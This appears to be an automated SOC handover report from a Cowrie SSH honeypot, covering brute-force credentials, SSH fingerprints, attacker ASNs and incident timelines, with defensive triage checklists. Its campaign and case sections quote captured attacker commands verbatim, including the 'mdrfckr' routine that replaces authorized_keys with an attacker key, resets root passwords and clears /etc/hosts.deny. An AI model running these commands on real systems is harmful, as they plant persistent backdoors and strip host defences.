# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-17 |
| **Generated At** | 2026-04-17T22:44:58Z |
| **Shift Time** | 22:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **117** |
| Confirmed Threats | **113** |
| False Positives Filtered | **4** (3.4%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **8** |
| High Severity Cases | **24** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **93** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **55** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **18** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 24 |
| `345gs5662d34` | 12 |
| `ubuntu` | 3 |
| `test` | 2 |
| `GET / HTTP/1.1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 10 |
| `Host: 13.235.92.17:2323` | 1 |
| `Accept-Encoding: gzip` | 1 |
| `xxx` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 10 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:2323` | 1 |
| `User-Agent: Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity` | `Accept-Encoding: gzip` | 1 |
| `user` | `xxx` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Zxcv123123` | `209.141.47.217` | 2026-04-17T20:56:22 |
| `root` | `3245gs5662d34` | `209.141.47.217` | 2026-04-17T20:56:28 |
| `root` | `Zh123456.` | `209.141.47.217` | 2026-04-17T21:03:44 |
| `root` | `A123456789b` | `209.141.47.217` | 2026-04-17T21:05:16 |
| `root` | `qwertyqwerty12` | `209.141.47.217` | 2026-04-17T21:08:06 |
| `root` | `as123456.` | `209.141.47.217` | 2026-04-17T21:15:23 |
| `root` | `qazwsx8888!!` | `209.141.47.217` | 2026-04-17T21:19:44 |
| `root` | `Qwertyuiop1234` | `14.103.112.179` | 2026-04-17T22:33:53 |
| `root` | `Aa147258@` | `52.233.193.61` | 2026-04-17T22:34:55 |
| `root` | `3245gs5662d34` | `52.233.193.61` | 2026-04-17T22:34:59 |
| `root` | `spider` | `103.172.236.241` | 2026-04-17T22:35:00 |
| `root` | `3245gs5662d34` | `103.172.236.241` | 2026-04-17T22:35:05 |
| `root` | `bbBB123` | `14.103.116.98` | 2026-04-17T22:36:45 |
| `root` | `Aa@12345678` | `120.48.15.138` | 2026-04-17T22:37:19 |
| `root` | `3245gs5662d34` | `120.48.15.138` | 2026-04-17T22:37:26 |
| `root` | `noroot` | `14.103.116.98` | 2026-04-17T22:41:31 |
| `root` | `qwertqwert12345` | `14.103.116.98` | 2026-04-17T22:42:54 |
| `root` | `3245gs5662d34` | `14.103.116.98` | 2026-04-17T22:43:01 |
| `root` | `123456_qwerty` | `14.103.116.98` | 2026-04-17T22:43:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **117** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 77 |
| Unknown | 4 |
| OpenSSH | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 77 | 9 |
| `b893695067f9...` | Mirai/variant | 1 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 77 | 9 | Modern SSH client |
| `95420f9d932d...` | Unknown | 4 | 2 | — |
| `b893695067f9...` | OpenSSH | 1 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:WcTlA09S2ohQ"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.116.98`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:vgqTeQeurQSw"|chpasswd|bash
```
Source IPs: `14.103.116.98`, `14.103.112.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.116.98`, `120.48.15.138`, `103.172.236.241`, `209.141.47.217`, `52.233.193.61`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **14** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS12389` | PJSC Rostelecom | 1 | MEDIUM |
| `AS38253` | Hanoi Telecom JSC | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | LOW |
| `AS53667` | FranTech Solutions | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (24)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-72db5495562e

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 20:56 |
| **Last Seen** | 2026-04-17 20:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 20:56:21` | `cowrie.session.connect` |
| `2026-04-17 20:56:21` | `cowrie.client.version` |
| `2026-04-17 20:56:21` | `cowrie.client.kex` |
| `2026-04-17 20:56:22` | `cowrie.login.success` |
| `2026-04-17 20:56:23` | `cowrie.session.params` |
| `2026-04-17 20:56:23` | `cowrie.command.input` |
| `2026-04-17 20:56:23` | `cowrie.command.failed` |
| `2026-04-17 20:56:23` | `cowrie.log.closed` |
| `2026-04-17 20:56:24` | `cowrie.session.params` |
| `2026-04-17 20:56:24` | `cowrie.command.input` |
| `2026-04-17 20:56:24` | `cowrie.session.file_download` |
| `2026-04-17 20:56:24` | `cowrie.log.closed` |
| `2026-04-17 20:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95ff975fa48f

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 20:56 |
| **Last Seen** | 2026-04-17 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 20:56:27` | `cowrie.session.connect` |
| `2026-04-17 20:56:27` | `cowrie.client.version` |
| `2026-04-17 20:56:27` | `cowrie.client.kex` |
| `2026-04-17 20:56:28` | `cowrie.login.success` |
| `2026-04-17 20:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3301242acf70

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:03 |
| **Last Seen** | 2026-04-17 21:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:03:43` | `cowrie.session.connect` |
| `2026-04-17 21:03:43` | `cowrie.client.version` |
| `2026-04-17 21:03:43` | `cowrie.client.kex` |
| `2026-04-17 21:03:44` | `cowrie.login.success` |
| `2026-04-17 21:03:45` | `cowrie.session.params` |
| `2026-04-17 21:03:45` | `cowrie.command.input` |
| `2026-04-17 21:03:45` | `cowrie.command.failed` |
| `2026-04-17 21:03:45` | `cowrie.log.closed` |
| `2026-04-17 21:03:46` | `cowrie.session.params` |
| `2026-04-17 21:03:46` | `cowrie.command.input` |
| `2026-04-17 21:03:46` | `cowrie.session.file_download` |
| `2026-04-17 21:03:46` | `cowrie.log.closed` |
| `2026-04-17 21:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e8f32fd0b12

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:03 |
| **Last Seen** | 2026-04-17 21:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:03:49` | `cowrie.session.connect` |
| `2026-04-17 21:03:49` | `cowrie.client.version` |
| `2026-04-17 21:03:49` | `cowrie.client.kex` |
| `2026-04-17 21:03:50` | `cowrie.login.success` |
| `2026-04-17 21:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebf58663687c

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:05 |
| **Last Seen** | 2026-04-17 21:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:05:14` | `cowrie.session.connect` |
| `2026-04-17 21:05:14` | `cowrie.client.version` |
| `2026-04-17 21:05:15` | `cowrie.client.kex` |
| `2026-04-17 21:05:16` | `cowrie.login.success` |
| `2026-04-17 21:05:16` | `cowrie.session.params` |
| `2026-04-17 21:05:16` | `cowrie.command.input` |
| `2026-04-17 21:05:16` | `cowrie.command.failed` |
| `2026-04-17 21:05:16` | `cowrie.log.closed` |
| `2026-04-17 21:05:17` | `cowrie.session.params` |
| `2026-04-17 21:05:17` | `cowrie.command.input` |
| `2026-04-17 21:05:17` | `cowrie.session.file_download` |
| `2026-04-17 21:05:17` | `cowrie.log.closed` |
| `2026-04-17 21:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06dd50ff557

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:05 |
| **Last Seen** | 2026-04-17 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:05:20` | `cowrie.session.connect` |
| `2026-04-17 21:05:20` | `cowrie.client.version` |
| `2026-04-17 21:05:20` | `cowrie.client.kex` |
| `2026-04-17 21:05:21` | `cowrie.login.success` |
| `2026-04-17 21:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfbade836672

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:08 |
| **Last Seen** | 2026-04-17 21:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:08:05` | `cowrie.session.connect` |
| `2026-04-17 21:08:05` | `cowrie.client.version` |
| `2026-04-17 21:08:05` | `cowrie.client.kex` |
| `2026-04-17 21:08:06` | `cowrie.login.success` |
| `2026-04-17 21:08:07` | `cowrie.session.params` |
| `2026-04-17 21:08:07` | `cowrie.command.input` |
| `2026-04-17 21:08:07` | `cowrie.command.failed` |
| `2026-04-17 21:08:07` | `cowrie.log.closed` |
| `2026-04-17 21:08:08` | `cowrie.session.params` |
| `2026-04-17 21:08:08` | `cowrie.command.input` |
| `2026-04-17 21:08:08` | `cowrie.session.file_download` |
| `2026-04-17 21:08:08` | `cowrie.log.closed` |
| `2026-04-17 21:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-767b921dbb98

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:08 |
| **Last Seen** | 2026-04-17 21:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:08:11` | `cowrie.session.connect` |
| `2026-04-17 21:08:11` | `cowrie.client.version` |
| `2026-04-17 21:08:11` | `cowrie.client.kex` |
| `2026-04-17 21:08:12` | `cowrie.login.success` |
| `2026-04-17 21:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b04d59e56f

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:15 |
| **Last Seen** | 2026-04-17 21:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:15:22` | `cowrie.session.connect` |
| `2026-04-17 21:15:22` | `cowrie.client.version` |
| `2026-04-17 21:15:22` | `cowrie.client.kex` |
| `2026-04-17 21:15:23` | `cowrie.login.success` |
| `2026-04-17 21:15:24` | `cowrie.session.params` |
| `2026-04-17 21:15:24` | `cowrie.command.input` |
| `2026-04-17 21:15:24` | `cowrie.command.failed` |
| `2026-04-17 21:15:24` | `cowrie.log.closed` |
| `2026-04-17 21:15:25` | `cowrie.session.params` |
| `2026-04-17 21:15:25` | `cowrie.command.input` |
| `2026-04-17 21:15:25` | `cowrie.session.file_download` |
| `2026-04-17 21:15:25` | `cowrie.log.closed` |
| `2026-04-17 21:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84573e97504a

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:15 |
| **Last Seen** | 2026-04-17 21:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:15:28` | `cowrie.session.connect` |
| `2026-04-17 21:15:28` | `cowrie.client.version` |
| `2026-04-17 21:15:28` | `cowrie.client.kex` |
| `2026-04-17 21:15:29` | `cowrie.login.success` |
| `2026-04-17 21:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e04d96e561

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-17 21:19 |
| **Last Seen** | 2026-04-17 21:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 21:19:43` | `cowrie.session.connect` |
| `2026-04-17 21:19:43` | `cowrie.client.version` |
| `2026-04-17 21:19:43` | `cowrie.client.kex` |
| `2026-04-17 21:19:44` | `cowrie.login.success` |
| `2026-04-17 21:19:45` | `cowrie.session.params` |
| `2026-04-17 21:19:45` | `cowrie.command.input` |
| `2026-04-17 21:19:45` | `cowrie.command.failed` |
| `2026-04-17 21:19:45` | `cowrie.log.closed` |
| `2026-04-17 21:19:46` | `cowrie.session.params` |
| `2026-04-17 21:19:46` | `cowrie.command.input` |
| `2026-04-17 21:19:46` | `cowrie.session.file_download` |
| `2026-04-17 21:19:46` | `cowrie.log.closed` |
| `2026-04-17 21:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
